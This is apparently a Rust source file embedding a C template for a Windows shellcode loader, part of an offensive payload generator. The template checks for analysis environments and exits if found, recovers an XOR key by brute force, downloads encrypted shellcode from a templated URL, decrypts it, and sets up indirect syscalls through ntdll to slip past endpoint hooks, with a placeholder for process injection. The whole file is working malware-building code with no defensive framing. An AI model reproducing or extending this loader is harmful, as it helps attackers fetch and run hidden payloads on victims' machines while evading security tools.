pub const MAIN_C: &str = r#"
#include <stdio.h>
#include <windows.h>

#include "../include/Anti.h"
#include "../include/IndirectSyscall.h"
#include "../include/Tool.h"
#include "../include/Web.h"
{INCLUDE}

#define KEY_SIZE 16
#define BUFFER_SIZE {BUFFERSIZE}
char EncryptedKey[] = {{PROTECTED_KEY}};
#define NumberOfElements 10
//{CAROKANN_SHELLCODE_ARR}
BOOL myBForceKey(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey,
                 OUT PBYTE* ppRealKey) {
    BYTE b = 0;
    PBYTE pRealKey = (PBYTE)malloc(sKey);

    while (1) {
        if (((pProtectedKey[0] ^ b) - 0) == HintByte)
            break;
        else
            b++;
    }

    for (int i = 0; i < sKey; i++) {
        pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) ^ i);
    }

    *ppRealKey = pRealKey;

    return TRUE;
}

BOOL XXOOR(IN PBYTE pBuffer, IN SIZE_T sBufferSize, IN PBYTE key,
           IN SIZE_T sKeySize) {
    if (pBuffer == NULL || key == NULL || sBufferSize == 0 || sKeySize == 0) {
        return FALSE;
    }

    for (SIZE_T i = 0; i < sBufferSize; i++) {
        pBuffer[i] ^= key[i % sKeySize];
    }

    return TRUE;
}
int main(int argc, char* argv[]) {
    if (CheckAll()) {
        return EXIT_SUCCESS;
    }
    PBYTE pBuffer = NULL;
    PBYTE pRealKey = NULL;

    BOOL DECSTATUS =
        myBForceKey({HINT_BYTE}, (PBYTE)EncryptedKey, KEY_SIZE, &pRealKey);
    PrintBuffer(pRealKey, KEY_SIZE);

    SIZE_T sBufferSize = BUFFER_SIZE;
    pBuffer = (PBYTE)LocalAlloc(LPTR, BUFFER_SIZE);
    printf("[#] Downloading From URl...\n");
    DownloadFromUrl(L"{SHELLCODE_URL}", pBuffer, sBufferSize);
    // PrintBuffer(pBuffer, BUFFER_SIZE);

    BOOL result = XXOOR(pBuffer, BUFFER_SIZE, pRealKey, KEY_SIZE);
    // PrintBuffer(pBuffer, BUFFER_SIZE);

    NTDLL_CONFIG NtdllConfig = {0};
    PNTDLL_CONFIG pNtdllConfig = &NtdllConfig;
    NTDLL_INIT_STATUS NtdllConfigStatus = InitNtdllConfig(pNtdllConfig);
    if (NtdllConfigStatus != NTDLL_INIT_STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }
    NTAPI_FUNC Nt = {0};
    PNTAPI_FUNC g_Nt = &Nt;
    NTSYSCALL_INIT_STATUS NtSyscallStatus = InitSyscall(g_Nt, pNtdllConfig);
    printf("[+] Done!");


{INJECTION}
    return EXIT_SUCCESS;
}
"#;
